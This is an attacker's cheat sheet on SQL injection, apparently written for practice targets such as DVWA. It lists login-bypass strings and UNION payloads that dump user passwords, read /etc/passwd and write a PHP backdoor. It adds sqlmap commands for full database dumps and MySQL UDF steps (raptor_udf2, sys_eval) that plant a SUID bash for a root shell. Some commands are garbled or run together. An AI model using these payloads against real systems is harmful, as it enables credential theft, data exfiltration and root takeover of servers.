# SQL
### Authentication bypass

‘ or 1=1 #

‘ or 1=1 —

‘ or 1=1 ; #

‘or 1=1 ; —

---

### Enum database

check input field → ‘ 

- 1’ order by 3 # —> to know number of columns
    - 1’ or ‘1’=’1 —> retrieve all data
- 1’ or 0=0 union select null, version() # —> db version
- 1’ or 0=0 union select null, user() # —> db user
- %’ or 0=0 union select null, database() # —> db name
- %’ and1=0 union select null, table_name from information_schema.tables # —> print all tables in all db
- %’ and 1=0 union select null, schema_name from information_schema.schemata # —> print all DB.s
- %’ and 1=0 union select table_schema, table_name from information_schema.tables # —> print all tables and db.s
- %’ and 1=0 union select table_name , columns_name from information_schema.columns # —> print all columns from all tables
- %’ 1=0 union select user, password from dvwa.users # —> we are in :3
- %’ 1=0 union select null, load_file(’/etc/passwd’) # —> the evil part :3
- %’ 1=0 union select null. “write everything you want :3  “ into OUTFILE ‘/tmp/backdoor.php’ #

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Table_schema ⇒ whitch have all data bases

Table_name ⇒ whitch have all tables name 

select table name from informayion_schema.tables

select <column name> from <database.table>

---

## SQLMAP

**Simple HTTP GET Based Test**

`sqlmap -u https://testsite.com/page.php?id=7 --dbs`

**Simple HTTP POST Based Test**

**`sqlmap -r <request_file> -p <vulnerable_parameter> --dbs`**

`sqlmap -r req.txt -p blood_group --dbs`
⇒ Now that we have the databases, let's extract tables from the database ←→

**Using GET based Method**

**`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --tables`**
`sqlmap -u https://testsite.com/page.php?id=7 -D blood --tables`

**Using POST based Method**

**`sqlmap -r req.txt -p <vulnerable_parameter> -D <database_name> --tables`**

`sqlmap -r req.txt -p blood_group -D blood --tables`

Once we have available tables, now let’s gather the columns from the table **blood_db**

**Using GET based Method**

`sqlmap -u https://testsite.com/page.php?id=7 -D blood -T blood_db --columns`

**`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> -T <table_name> --columns`Using POST based Method**

`sqlmap -r req.txt -D blood -T blood_db --columns`

**`sqlmap -r req.txt -D <database_name> -T <table_name> --columns`**

Or we can simply dump all the available databases and tables using the following commands.

**Using GET based Method**

`sqlmap -u https://testsite.com/page.php?id=7 -D <database_name> --dump-allsqlmap -u https://testsite.com/page.php?id=7 -D blood --dump-all`

**Using POST based Method**

`sqlmap -r req.txt -D <database_name> --dump-allsqlmap -r req.txt-p  -D <database_name> --dump-all`
-------------------

If Mysql Is Running as root and you have credentials to access it then :

```sql
mysql> show databases;
mysql> use <table>;
mysql> CREATE FUNCTION sys_eval RETURNS INT SONAME ‘lib_mysqludf_sys.so’;
mysql> \! clear
mysql> select sys_eval("cp /bin/bash /var/tmp/bash ; chmod u+x /var/tmp/bash");
mysql> exit
```

.

```bash
# cd /var/tmp

# ./bash -p



bash-3.2# id
root
```

Or you can Do :
[•] Exploit Link : https://www.exploit-db.com/exploits/1518

[•] transfer this exploit to the target and use the following commands to compile it :

```bash
# gcc -g -c raptor_udf2.c -fPIC

# gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

[•] Connect to mysql service as root.

```sql
mysql -uroot
```

[•] Execute the following commands on the MySQL shell :

```sql
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
```

[•] Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

```sql
mysql> select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

[•] Exit out of the MySQL shell and Type :

```sql
/tmp/rootbash -p
```

.
